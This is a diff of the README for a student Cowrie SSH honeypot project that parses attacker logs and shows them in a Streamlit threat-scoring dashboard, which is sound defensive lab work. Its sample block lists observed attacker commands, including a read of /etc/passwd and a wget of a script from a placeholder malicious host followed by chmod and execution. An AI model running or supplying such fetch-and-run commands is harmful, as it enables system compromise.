@@ -1,40 +1,118 @@
-#Cowrie Honeypot Threat Intelligence Dashboard
-## Overview
-A cybersecurity lab project that uses Cowrie honeypot to capture real-world attacker behavior, parse Cowrie JSON logs with Python, and visualize attacker IPs and command activity in a Streamlit dashboard.
-## Feature
-- Captures attacker login attempts
-- Logs attacker commands
-- Parses Cowrie JSON logs using Python
-- Visualizes attacker behavior with Matplotlib
-- Displays attacker IPs and command activity in a Streamlit dashboard
+# 🛡️ Honeypot-Based Threat Intelligence Dashboard
 
-## Key Insights
-- Identified common attacker reconnaissance commands (whoami, uname, ls)
-- Observed credential harvesting attempts (/etc/passwd access)
-- Captured automated attack behavior via wget malware download attempts
+## 📌 Overview
 
-## Tools Used
-- Cowrie
-- Python
-- Matplotlib
-- Streamlit
-- Ubuntu VM
+This project implements a **real-time threat intelligence dashboard** using the Cowrie SSH honeypot. It captures attacker behavior, analyzes commands, and visualizes activity through an interactive Streamlit dashboard.
 
-## Sample Attacker Commands Observed
-- whoami
-- uname -a
-- ls
-- pwd
-- cat /etc/passwd
-- wget http://malicious.com/malware.sh
+The system simulates a **Security Operations Center (SOC)** workflow by detecting, classifying, and scoring attacker actions in real time.
 
-## Sample Dashboard
-![Top Commands](screenshots/commands.png)
+---
 
-## Files
-- parser.py
-- visualize.py
-- dashboard.py
-- commands.png
+## 🚀 Key Features
 
+* 🔄 **Real-Time Event Monitoring**
 
+  * Streams attacker commands and login attempts live
+
+* 🔴 **High-Risk Alert Detection**
+
+  * Automatically flags suspicious sessions based on behavior
+
+* 📊 **Threat Scoring System**
+
+  * Assigns dynamic risk scores to each attacker IP
+
+* 🧠 **Behavioral Classification**
+
+  * Categorizes commands into:
+
+    * Reconnaissance
+    * Credential Access
+    * Malware Download
+    * Execution
+
+* ⏰ **Temporal Attack Analysis**
+
+  * Identifies peak attack times and patterns
+
+* 📈 **Interactive Dashboard**
+
+  * Built using Streamlit and Matplotlib
+
+---
+
+## 📊 Dashboard Preview
+
+![Dashboard](screenshots/dashboard.png)
+
+---
+
+## 🎥 Live Attack Demo
+
+[▶️ Watch Demo](screenshots/demo.mov)
+
+---
+
+## 🛠️ Technologies Used
+
+* Cowrie Honeypot
+* Python
+* Streamlit
+* Matplotlib
+* GeoIP2
+* Ubuntu VM
+
+---
+
+## 🔍 Sample Attacker Behavior
+
+Commands executed during live testing:
+
+```bash
+whoami
+cat /etc/passwd
+wget http://malicious.com/malware.sh
+chmod +x malware.sh
+./malware.sh
+```
+
+---
+
+## 🧠 Key Insights
+
+* Attackers typically begin with reconnaissance before exploitation
+* Access to `/etc/passwd` indicates credential harvesting attempts
+* Malware download attempts often follow reconnaissance
+* Peak activity suggests automated attack behavior
+* System successfully detects and scores high-risk sessions in real time
+
+---
+
+## 📂 Project Structure
+
+```bash
+honeypot-project/
+├── dashboard.py
+├── scripts/
+│   └── parser.py
+├── screenshots/
+│   ├── dashboard.png
+│   └── demo.mov
+└── README.md
+```
+
+---
+
+## 🎯 Future Improvements
+
+* Deploy honeypot on cloud for real external attacker traffic
+* Integrate threat intelligence APIs (AbuseIPDB, VirusTotal)
+* Add session tracking per attacker
+* Implement real-time alert notifications
+
+---
+
+## 👨‍💻 Author
+
+Anjana Raghavendra
+Cybersecurity / Network Security Student
